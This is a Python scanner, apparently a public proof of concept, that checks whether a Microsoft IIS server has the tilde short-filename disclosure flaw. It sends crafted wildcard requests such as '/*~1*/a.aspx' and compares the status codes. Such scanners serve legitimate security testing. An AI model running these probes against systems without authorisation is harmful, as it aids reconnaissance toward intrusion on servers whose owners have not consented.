#!/usr/bin/env python
# -*- encoding: utf-8 -*-
"""
@File    :   IIS_Tilde_Vuln_PoC.py
@Time    :   2021/04/05 23:34:53
@Author  :   Hack3rHan 
@Contact :   Hack3rHan@protonmail.com
"""
import argparse
import re
import requests

from urllib.parse import urlparse


class Scanner(object):

    def __init__(self, url: str):
        self.url = url
        self.iis_version = None

        self._url_scheme = ''
        self._url_netloc = ''
        self._url_path = ''

    def is_vulnerable(self) -> bool:
        self._parse_url()
        if not self._url_scheme or not self._url_netloc:
            print('[!]ERROR: Can Not get parse target url.')

        self._get_iis_version()
        if not self.iis_version:
            print('[!]ERROR: Can Not get IIS version From http headers.')
            return False

        valid_url = ''.join([self._url_scheme, '://',self._url_netloc, '/*~1*/a.aspx'])
        invalid_url = ''.join([self._url_scheme, '://',self._url_netloc, '/invalid*~1*/a.aspx'])
        try:
            self.valid_resp_get = requests.get(url=valid_url, verify=False, timeout=10)
            self.valid_resp_options = requests.options(url=valid_url, verify=False, timeout=10)
            self.invalid_resp_get = requests.get(url=invalid_url, verify=False, timeout=10)
            self.invalid_resp_options = requests.options(url=invalid_url, verify=False, timeout=10)
        except Exception as err:
            print(f'[!]ERROR: HTTP Connection EROOR. {err}')
            return False

        if self.valid_resp_get.status_code == 404 and self.invalid_resp_get.status_code == 400:
            return True
        elif self.valid_resp_options.status_code == 404 and self.invalid_resp_options.status_code == 400:
            return True
        else:
            return False

    def _get_iis_version(self):
        try:
            resp = requests.get(url=self.url, verify=False, timeout=15)
        except Exception as err:
            print(f'[!]ERROR: HTTP Connection EROOR. {err}')
            return
        match_obj = re.search('Microsoft-IIS/([0-9].?\.[0-9]?)', str(resp.headers), re.IGNORECASE)
        if not match_obj:
            return
        self.iis_version = match_obj[1]

    def _parse_url(self):
        parse_res = urlparse(self.url)
        self._url_scheme = parse_res[0]
        self._url_netloc = parse_res[1]
        self._url_path = parse_res[2]


def main():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('-u','--url', help='The URL of the target.', action='store')
    args = arg_parser.parse_args()

    if not args.url:
        arg_parser.print_help()
        return
    
    scanner = Scanner(url=args.url)
    if scanner.is_vulnerable():
        print('[*]INFO: Target is vulnerable.')
        print('[*]INFO: <HTTP GET> URL:{} HTTP STATUS CODE:{}'.format(scanner.valid_resp_get.request.url, scanner.valid_resp_get.status_code))
        print('[*]INFO: <HTTP GET> URL:{} HTTP STATUS CODE:{}'.format(scanner.invalid_resp_get.request.url, scanner.invalid_resp_get.status_code))
        print('[*]INFO: <HTTP OPTIONS> URL:{} HTTP STATUS CODE:{}'.format(scanner.valid_resp_options.request.url, scanner.valid_resp_options.status_code))
        print('[*]INFO: <HTTP OPTIONS> URL:{} HTTP STATUS CODE:{}'.format(scanner.invalid_resp_options.request.url, scanner.invalid_resp_options.status_code))
    else:
        print('[*]INFO: Target is NOT vulnerable.')


if __name__ == '__main__':
    main()
